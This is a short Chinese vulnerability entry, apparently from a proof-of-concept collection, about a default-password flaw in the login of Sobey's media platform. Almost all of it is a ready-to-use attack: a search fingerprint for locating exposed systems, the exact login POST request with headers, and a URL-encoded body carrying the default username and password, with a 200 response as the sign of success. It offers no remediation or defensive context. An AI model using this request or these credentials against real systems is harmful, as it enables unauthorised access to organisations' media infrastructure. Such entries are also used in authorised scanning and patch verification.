# 索贝融媒体login存在弱口令漏洞

- **系统**：索贝融媒体　|　**类型**：默认口令　|　**CVE**：—
- **指纹**：`body="/Sc-TaskMonitoring/"`
- **请求**：`POST /portal//Login/login HTTP/1.1`
- **关键头**：`Content-Length: 161`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`Cookie: JSESSIONID=C82C17A4696C2D077F7B0DCF90181FF9; lang=zh`

**请求体 / payload**
```
_BSP_REQ_DATA=%7B%22_BSP_ACTION%22%3A%22%2FLogin%2Flogin%22%2C%22UserName%22%3A%22sobey%22%2C%22Password%22%3A%22Sobeyhive-2016%22%2C%22siteCode%22%3A%22S1%22%7D
```
- **预期**：200　|　—